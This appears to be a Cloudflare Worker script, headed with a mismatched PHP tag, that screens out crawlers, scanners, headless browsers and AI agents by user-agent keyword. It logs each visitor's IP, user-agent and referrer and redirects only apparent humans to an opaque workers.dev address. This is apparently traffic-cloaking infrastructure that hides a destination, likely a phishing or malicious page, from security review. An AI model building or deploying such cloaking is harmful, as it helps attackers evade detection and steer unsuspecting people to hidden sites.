<?php
// Configuration
const redirectUrl = "https://707e3565.45dea72c27a70fa75e4d6281.workers.dev"; // URL to redirect to
const rateLimit = 5; // Max requests per IP per hour

// Bot Detection Logic
const botKeywords = [
    'bot', 'crawl', 'spider', 'slurp', 'search', 'curl', 'wget', 'python', 'php',
    'headless', 'chrome-headless', 'phantomjs', 'selenium', 'playwright', 'puppeteer',
    'chatgpt', 'openai', 'gpt-3', 'gpt-4', 'ai', 'machine learning'
];

function isBot(userAgent) {
    const userAgentLower = userAgent.toLowerCase();
    
    // Check for common bot indicators in the user-agent
    for (let keyword of botKeywords) {
        if (userAgentLower.includes(keyword)) {
            return true;
        }
    }

    // Additional bot checks for suspicious patterns or very short user-agent strings
    if (userAgent.length < 10) {
        return true;
    }

    return false;
}

// Rate Limiting Logic
let rateLimitData = {}; // Store rate limits in memory (in a production setup, use KV Storage)

async function isRateLimited(ip) {
    const currentTime = Math.floor(Date.now() / 1000); // Get current time in seconds
    const hourAgo = currentTime - 3600;

    if (rateLimitData[ip]) {
        // Remove any outdated requests
        rateLimitData[ip] = rateLimitData[ip].filter(timestamp => timestamp > hourAgo);

        // Check if the user exceeded the rate limit
        if (rateLimitData[ip].length >= rateLimit) {
            return true; // Exceeded rate limit
        }

        // Add the current timestamp to the list of requests for this IP
        rateLimitData[ip].push(currentTime);
    } else {
        rateLimitData[ip] = [currentTime]; // First request for this IP
    }

    return false; // Not rate limited
}

// Handle the request
async function handleRequest(event) {
    const request = event.request;
    const url = new URL(request.url);
    const ip = request.headers.get('CF-Connecting-IP'); // Cloudflare gives the real IP address
    const userAgent = request.headers.get('User-Agent') || '';
    const referrer = request.headers.get('Referer') || '';

    // Check if the user is a bot or rate-limited
    if (isBot(userAgent) || await isRateLimited(ip)) {
        return new Response('Access denied.', { status: 403 });
    }

    // Log the redirection request (in a real app, you could use logging services)
    console.log(`Redirecting IP: ${ip}, User-Agent: ${userAgent}, Referrer: ${referrer}`);

    // Perform the redirect
    return Response.redirect(redirectUrl, 302);
}

// Cloudflare Worker Event Listener
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event));
});
